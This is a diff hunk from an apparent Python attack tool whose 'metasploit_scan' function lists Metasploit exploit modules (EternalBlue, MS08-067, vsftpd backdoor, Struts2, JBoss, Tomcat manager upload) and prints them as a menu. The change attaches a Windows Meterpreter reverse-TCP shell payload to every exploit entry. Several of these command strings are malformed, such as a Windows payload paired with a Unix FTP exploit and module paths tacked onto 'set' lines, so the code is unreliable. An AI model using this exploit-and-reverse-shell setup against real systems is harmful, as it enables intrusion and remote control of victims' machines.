@@ -523,13 +523,13 @@ def metasploit_scan():
                     "55": "exploit/multi/http/struts2_code_exec",
                     "66": "exploit/multi/http/jboss_deployment_scanner",
                     "77": "exploit/windows/smb/ms17_010_eternalblue",
-                    "108": "set payload exploit/multi/http/tomcat_mgr_upload",
-                    "110": "set payload exploit/windows/dcerpc/ms03_026_dcom",
-                    "112": "set payload exploit/windows/smb/ms08_067_netapi",
-                    "114": "set payload exploit/unix/ftp/vsftpd_234_backdoor",
-                    "116": "set payload exploit/multi/http/struts2_code_exec",
-                    "118": "set payload exploit/multi/http/jboss_deployment_scanner",
-                    "120": "set payload exploit/windows/smb/ms17_010_eternalblue"
+                    "108": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/tomcat_mgr_upload",
+                    "110": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/dcerpc/ms03_026_dcom",
+                    "112": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/smb/ms08_067_netapi",
+                    "114": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/unix/ftp/vsftpd_234_backdoor",
+                    "116": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/struts2_code_exec",
+                    "118": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/jboss_deployment_scanner",
+                    "120": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/smb/ms17_010_eternalblue"
                 }
                 for key, value in exploits.items():
                     print(f"{key}: {value}")
